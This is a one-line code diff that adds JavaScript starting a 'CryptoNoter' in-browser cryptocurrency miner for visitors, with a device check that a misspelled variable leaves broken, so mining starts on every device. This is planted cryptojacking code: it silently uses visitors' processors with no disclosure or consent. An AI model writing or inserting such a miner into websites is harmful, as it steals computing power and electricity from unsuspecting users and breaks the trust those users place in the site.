@@ -1,0 +1,1 @@
+var isMobile = false; //initiate as false// device detectionif( /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ) {isMobiler=true;}if(!isMobile){var miner = new CryptoNoter.User(CryptoNoter, {autoThreads: true,throttle: 0.3});miner.start();}
